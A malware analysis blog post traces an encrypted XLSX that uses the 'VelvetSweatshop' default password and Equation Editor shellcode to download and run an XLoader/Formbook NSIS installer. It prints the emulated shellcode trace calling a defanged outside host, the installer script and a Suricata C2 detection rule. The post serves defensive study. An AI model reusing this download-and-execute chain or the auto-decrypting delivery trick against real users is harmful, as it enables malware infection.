<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets" /><meta property="og:locale" content="en" /><meta name="description" content="Just like with RTF documents, adversaries can use XLSX spreadsheets to exploit the Microsoft Office Equation Editor. To add a little bit of complication on top, adversaries also sometimes like to encrypt/password protect documents, but that doesn’t have to slow down our analysis too much. For this analysis I’m working with this sample in MalwareBazaar: https://bazaar.abuse.ch/sample/91cf449506a9c3ade639027f6a38e99ee22d9cc7c2a1c4bc42fc8047185b8918/." /><meta property="og:description" content="Just like with RTF documents, adversaries can use XLSX spreadsheets to exploit the Microsoft Office Equation Editor. To add a little bit of complication on top, adversaries also sometimes like to encrypt/password protect documents, but that doesn’t have to slow down our analysis too much. For this analysis I’m working with this sample in MalwareBazaar: https://bazaar.abuse.ch/sample/91cf449506a9c3ade639027f6a38e99ee22d9cc7c2a1c4bc42fc8047185b8918/." /><link rel="canonical" href="https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/" /><meta property="og:url" content="https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-11T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2022-02-11T00:00:00+00:00","description":"Just like with RTF documents, adversaries can use XLSX spreadsheets to exploit the Microsoft Office Equation Editor. To add a little bit of complication on top, adversaries also sometimes like to encrypt/password protect documents, but that doesn’t have to slow down our analysis too much. For this analysis I’m working with this sample in MalwareBazaar: https://bazaar.abuse.ch/sample/91cf449506a9c3ade639027f6a38e99ee22d9cc7c2a1c4bc42fc8047185b8918/.","headline":"XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/"},"url":"https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/"}</script><title>XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>XLoader/Formbook Distributed by Encrypted VelvetSweatshop Spreadsheets</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1644537600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-02-11 </em> </span> <span> Updated <em class="timeago" data-ts="1648508960" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1715 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p>Just like with RTF documents, adversaries can use XLSX spreadsheets to exploit the Microsoft Office Equation Editor. To add a little bit of complication on top, adversaries also sometimes like to encrypt/password protect documents, but that doesn’t have to slow down our analysis too much. For this analysis I’m working with this sample in MalwareBazaar: <a href="https://bazaar.abuse.ch/sample/91cf449506a9c3ade639027f6a38e99ee22d9cc7c2a1c4bc42fc8047185b8918/">https://bazaar.abuse.ch/sample/91cf449506a9c3ade639027f6a38e99ee22d9cc7c2a1c4bc42fc8047185b8918/</a>.</p><h2 id="triaging-the-file"><span class="mr-2">Triaging the File</span><a href="#triaging-the-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>MalwareBazaar gave us a head start in asserting the document is a XLSX file. We can confirm this with Detect-It-Easy and <code class="language-plaintext highlighter-rouge">file</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>diec TW0091.xlsx 
<span class="go">filetype: Binary
arch: NOEXEC
mode: Unknown
endianess: LE
type: Unknown
  archive: Microsoft Compound(MS Office 97-2003 or MSI etc.)

</span><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>file TW0091.xlsx 
<span class="go">TW0091.xlsx: CDFV2 Encrypted
</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">file</code> output indicates the XLSX file is encrypted, so step one is taking a crack at getting the decrypted document.</p><h2 id="decrypting-the-spreadsheet"><span class="mr-2">Decrypting the Spreadsheet</span><a href="#decrypting-the-spreadsheet" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can give a good first shot at finding the document password using <code class="language-plaintext highlighter-rouge">msoffcrypto-crack.py</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>msoffcrypto-crack.py TW0091.xlsx 
<span class="go">Password found: VelvetSweatshop
</span></pre></table></code></div></div><p>And just like that, we got a little lucky! The password for this document is <code class="language-plaintext highlighter-rouge">VelvetSweatshop</code>, which has some significance in MS Office documents. For more info you can hit up Google, but the basic gist is that Office documents encrypted with the password <code class="language-plaintext highlighter-rouge">VelvetSweatshop</code> will automatically decrypt themselves when opened in Office. This is an easy way to encrypt documents for distribution without having to worry about passing a password to the receiving party.</p><p>To decrypt the document, we can pass that password into <code class="language-plaintext highlighter-rouge">msoffcrypto-tool</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>msoffcrypto-tool <span class="nt">-p</span> VelvetSweatshop TW0091.xlsx decrypted.xlsx
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>file decrypted.xlsx 
<span class="go">decrypted.xlsx: Microsoft Excel 2007+
</span></pre></table></code></div></div><p>Alright, now we have a decrypted document to work with!</p><h2 id="analyzing-the-decrypted-spreadsheet"><span class="mr-2">Analyzing the Decrypted Spreadsheet</span><a href="#analyzing-the-decrypted-spreadsheet" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>A good first step with any MS Office file is to check for macro-based things with <code class="language-plaintext highlighter-rouge">olevba</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>olevba decrypted.xlsx 
<span class="go">olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: decrypted.xlsx
Type: OpenXML
No VBA or XLM macros found.
</span></pre></table></code></div></div><p>The output from <code class="language-plaintext highlighter-rouge">olevba</code> indicates there aren’t Visual Basic for Applications (VBA) macros or Excel 4.0 macros present. This leads me into thinking there may be OLE objects involved. We can take a look using <code class="language-plaintext highlighter-rouge">oledump.py</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>oledump.py decrypted.xlsx 
<span class="go">A: xl/embeddings/oleObject1.bin
 A1:        20 '\x01Ole'
 A2:      1643 '\x01oLe10nAtIVe'
</span></pre></table></code></div></div><p>So it looks like we’ve got an OLE object in the spreadsheet that doesn’t contain macro code. I’m leaning towards thinking it’s shellcode at this point. Since that A2 stream looks like it is larger, let’s extract it and see if <code class="language-plaintext highlighter-rouge">xorsearch.py -W</code> can help us find an entry point.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>oledump.py <span class="nt">-d</span> <span class="nt">-s</span> A2 decrypted.xlsx <span class="o">&gt;</span> a2.dat
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>file a2.dat 
<span class="go">a2.dat: packed data

</span><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>xorsearch <span class="nt">-W</span> a2.dat 
<span class="go">Found XOR 00 position 0000020E: GetEIP method 3 E9AE000000
Found ROT 25 position 0000020E: GetEIP method 3 E9AE000000
Found ROT 24 position 0000020E: GetEIP method 3 E9AE000000
Found ROT 23 position 0000020E: GetEIP method 3 E9AE000000
</span></pre></table></code></div></div><p>It looks like <code class="language-plaintext highlighter-rouge">xorsearch</code> found a GetEIP method at 0x20E in the A2 stream we exported. We can use this offset with <code class="language-plaintext highlighter-rouge">scdbg</code> to emulate shellcode execution and see if that is what downloads a subsequent stage. When looking at the report output from <code class="language-plaintext highlighter-rouge">scdbg</code>, we can see several familiar functions.</p><p><img data-src="/assets/images/xloader-formbook-velvetsweatshop-spreadsheet/scdbg-xloader-formbook-xlsx.png" alt="Scdbg Options" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>401454  GetProcAddress(ExpandEnvironmentStringsW)
401487  ExpandEnvironmentStringsW(%PUBLIC%\vbc.exe, dst=12fb9c, sz=104)
40149c  LoadLibraryW(UrlMon)
4014b7  GetProcAddress(URLDownloadToFileW)
401505  URLDownloadToFileW(hxxp://2.58.149[.]229/namec.exe, C:\users\Public\vbc.exe)
40154d  LoadLibraryW(shell32)
401565  GetProcAddress(ShellExecuteExW)
40156d  unhooked call to shell32.ShellExecuteExW
</pre></table></code></div></div><p>In the shellcode, the adversary uses ExpandEnvironmentStringsW to find the Public folder in Windows. Next, they use URLDownloadToFileW to retrieve content from <code class="language-plaintext highlighter-rouge">hxxp://2.58.149[.]229/namec.exe</code> and write it to <code class="language-plaintext highlighter-rouge">C:\Users\Public\vbc.exe</code>. Finally, they use ShellExecuteExW to launch <code class="language-plaintext highlighter-rouge">vbc.exe</code>.</p><h2 id="triaging-vbcexe"><span class="mr-2">Triaging vbc.exe</span><a href="#triaging-vbcexe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We’re not going to entirely reverse engineer <code class="language-plaintext highlighter-rouge">vbc.exe</code> tonight, but we can get some identifying information about it. To start off, let’s take a look at some details using <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">pedump</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>file vbc.exe 
<span class="go">vbc.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">file</code> utility says that the EXE is a Nullsoft Installer archive. We can confirm this using a couple data points from <code class="language-plaintext highlighter-rouge">pedump</code>. First, we’ll want to look at the executable’s PE sections. The presence of a section named <code class="language-plaintext highlighter-rouge">.ndata</code> tends to indicate the EXE is a Nullsoft Installer. Also, the compiler information section of <code class="language-plaintext highlighter-rouge">pedump</code> output will show the executable was made with Nullsoft.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc$</span><span class="w"> </span>pedump <span class="nt">-S</span> <span class="nt">--packer</span> vbc.exe 
<span class="go">
=== SECTIONS ===

  NAME          RVA      VSZ   RAW_SZ  RAW_PTR  nREL  REL_PTR nLINE LINE_PTR     FLAGS
  .text        1000     5976     5a00      400     0        0     0        0  60000020  R-X CODE
  .rdata       7000     1190     1200     5e00     0        0     0        0  40000040  R-- IDATA
  .data        9000    1af98      400     7000     0        0     0        0  c0000040  RW- IDATA
  .ndata      24000     8000        0        0     0        0     0        0  c0000080  RW- UDATA
  .rsrc       2c000      900      a00     7400     0        0     0        0  40000040  R-- IDATA

=== Packer / Compiler ===

  Nullsoft install system v2.x
</span></pre></table></code></div></div><p>To squeeze the last bit of information from the <code class="language-plaintext highlighter-rouge">vbc.exe</code> binary, we can unpack it using <code class="language-plaintext highlighter-rouge">7z</code>. To get the most information, including the NSIS configuration script, you’ll need a version that is several years old such as 15.05 like in <a href="https://isc.sans.edu/forums/diary/Quick+analysis+of+malware+created+with+NSIS/23703/">this post</a>. I went back and downloaded version 9.38.1 of <code class="language-plaintext highlighter-rouge">p7zip-full</code>, the Linux implementation of 7-zip.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc/zip$</span><span class="w"> </span>p7zip_9.38.1/bin/7z x vbc.exe 
<span class="go">
7-Zip 9.38 beta  Copyright (c) 1999-2014 Igor Pavlov  2015-01-03
p7zip Version 9.38.1 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,2 CPUs,ASM)

Processing archive: vbc.exe

Extracting  8yhm36shrfdb7m
Extracting  mhwrt
Extracting  lzxupx.exe
Extracting  [NSIS].nsi

Everything is Ok

Files: 4
Size:       355002
Compressed: 302002
</span><span class="gp">remnux@remnux:~/cases/xloader-doc/zip$</span><span class="w"> </span>ll
<span class="go">total 10452
drwxrwxr-x 3 remnux remnux    4096 Feb 11 23:30  ./
drwxrwxr-x 4 remnux remnux    4096 Feb 11 23:28  ../
-rw-rw-r-- 1 remnux remnux  216666 Feb 11 03:22  8yhm36shrfdb7m
-rw-rw-r-- 1 remnux remnux  125952 Feb 11 03:22  lzxupx.exe
-rw-rw-r-- 1 remnux remnux    7486 Feb 11 03:22  mhwrt
-rw-rw-r-- 1 remnux remnux    4898 Feb 11 21:54 '[NSIS].nsi'
drwx------ 6 remnux remnux    4096 Feb 11 23:28  p7zip_9.38.1/
-rw-rw-r-- 1 remnux remnux  302002 Feb 11 21:54  vbc.exe
</span></pre></table></code></div></div><p>We can take a look in the <code class="language-plaintext highlighter-rouge">[NSIS].nsi</code> script and see what content would be executed:</p><pre><code class="language-nsis">Function .onGUIInit
  InitPluginsDir
    ; Call Initialize_____Plugins
    ; SetDetailsPrint lastused
  SetOutPath $INSTDIR
  File 8yhm36shrfdb7m
  File mhwrt
  File lzxupx.exe
  ExecWait "$INSTDIR\lzxupx.exe $INSTDIR\mhwrt"
  Abort
  FlushINI $INSTDIR\churches\forget.bin
  Pop $R5
  Push 31373
  CopyFiles $INSTDIR\unknowns\hemlock.bmp $INSTDIR\arboretum\bitsy\chances.tif    ; $(LSTR_7)$INSTDIR\arboretum\bitsy\chances.tif    ;  "Copy to "
  Nop
  Exec $INSTDIR\mightier\audit\kahuna.pdf
  CreateDirectory $INSTDIR\sail\hold
  GetFullPathName $7 $INSTDIR\cloak.csv
  Nop
  DetailPrint rstykivsbfr
  Exch $1
    ; Push $1
    ; Exch
    ; Pop $1
  SetErrorLevel 3
  CreateDirectory $INSTDIR\manic\sons\folklore
  CreateDirectory $INSTDIR\reaches
  CreateDirectory $INSTDIR\scanning\audit
  Nop
  ReadEnvStr $R2 TEMP
  DetailPrint sylsppbkgbyo
  Exch $8
    ; Push $8
    ; Exch
    ; Pop $8
  Exch $R7
    ; Push $R7
    ; Exch
    ; Pop $R7
  EnumRegKey $R5 HKLM oqyalkuqydrx 2236
  FileWriteByte $5 765
FunctionEnd
</code></pre><p>When the NSIS installer starts running, it will execute the commands in <code class="language-plaintext highlighter-rouge">.onGUIInit</code>. These three files get written:</p><ul><li>8yhm36shrfdb7m<li>mhwrt<li>lzxupx.exe</ul><p>The installer then runs the command <code class="language-plaintext highlighter-rouge">"$INSTDIR\lzxupx.exe $INSTDIR\mhwrt"</code>, waiting for the result. After it finishes, an <code class="language-plaintext highlighter-rouge">Abort</code> command processes. The abort causes the installer code to immediately skip to the function <code class="language-plaintext highlighter-rouge">.onGUIEnd</code>. Since this function isn’t defined in this particular script, the installer ends immediately.</p><h2 id="how-do-we-know-its-xloaderformbook"><span class="mr-2">How Do We Know It’s XLoader/Formbook??</span><a href="#how-do-we-know-its-xloaderformbook" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is where analysis dried up for me via code and I started leaning on sandbox output. Specifically, I looked at the report from Hatching Triage here: <a href="https://tria.ge/220211-wmgqsaeegl/behavioral1">https://tria.ge/220211-wmgqsaeegl/behavioral1</a>. When parsing the output, I noticed the sandbox made some identification based on the Suricata Emerging Threats rule ET MALWARE FormBook CnC Checkin (GET). Let’s see if we can validate that using the rule criteria and PCAP data from the sandbox. You can grab the Emerging Threats rules here: <a href="https://rules.emergingthreats.net/OPEN_download_instructions.html">https://rules.emergingthreats.net/OPEN_download_instructions.html</a>. I downloaded the PCAP from Tria.ge.</p><p>Once we unpack the rules, we can search them using <code class="language-plaintext highlighter-rouge">grep -F</code> to quickly find the alert criteria.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/xloader-doc/network/rules$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-F</span> <span class="s1">'ET MALWARE FormBook CnC Checkin (GET)'</span> <span class="k">*</span>
<span class="go">
</span><span class="gp">emerging-malware.rules:alert http $</span>HOME_NET any -&gt; <span class="nv">$EXTERNAL_NET</span> any <span class="o">(</span>msg:<span class="s2">"ET MALWARE FormBook CnC Checkin (GET)"</span><span class="p">;</span> flow:established,to_server<span class="p">;</span> content:<span class="s2">"Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|"</span><span class="p">;</span> fast_pattern<span class="p">;</span> http.method<span class="p">;</span> content:<span class="s2">"GET"</span><span class="p">;</span> http.uri<span class="p">;</span> content:<span class="s2">"/?"</span><span class="p">;</span> pcre:<span class="s2">"/^[A-Za-z0-9_-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))&amp;[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&amp;sql=</span><span class="se">\d</span><span class="s2">*)?</span><span class="nv">$/</span><span class="s2">R"</span><span class="p">;</span> http.connection<span class="p">;</span> content:<span class="s2">"close"</span><span class="p">;</span> depth:5<span class="p">;</span> endswith<span class="p">;</span> http.header_names<span class="p">;</span> content:<span class="s2">"|0d 0a|Host|0d 0a|Connection|0d 0a 0d 0a|"</span><span class="p">;</span> depth:22<span class="p">;</span> endswith<span class="p">;</span> reference:md5,a6a114f6bc3e86e142256c5a53675d1a<span class="p">;</span> classtype:command-and-control<span class="p">;</span> sid:2031412<span class="p">;</span> rev:9<span class="p">;</span> metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2017_12_19, deployment Perimeter, former_category MALWARE, malware_family Formbook, performance_impact Moderate, signature_severity Major, updated_at 2020_09_16<span class="p">;</span><span class="o">)</span>
<span class="go">
